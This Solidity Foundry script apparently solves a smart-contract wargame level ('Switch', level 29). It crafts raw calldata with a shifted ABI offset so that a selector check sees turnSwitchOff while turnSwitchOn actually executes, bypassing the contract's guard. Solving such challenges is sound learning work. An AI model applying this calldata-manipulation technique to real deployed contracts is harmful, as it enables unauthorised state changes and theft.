// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Switch} from "../src/level29/Switch.sol";

import "forge-std/console.sol";

contract level29Exploit is Script {
    Switch switchContract = Switch(0x31F6cadB360Bb73f348a6fd4e5fCA966BCacccF4);

    function run() external {
        vm.startBroadcast();

        console.log("Switch: ", switchContract.switchOn());

        address(switchContract).call(
            bytes.concat(
                switchContract.flipSwitch.selector,
                bytes32(uint(0x60)),
                bytes32(0),
                bytes32(switchContract.turnSwitchOff.selector),
                bytes32(uint(0x04)),
                switchContract.turnSwitchOn.selector
            )
        );

        console.log("Switch: ", switchContract.switchOn());
        vm.stopBroadcast();
    }
}
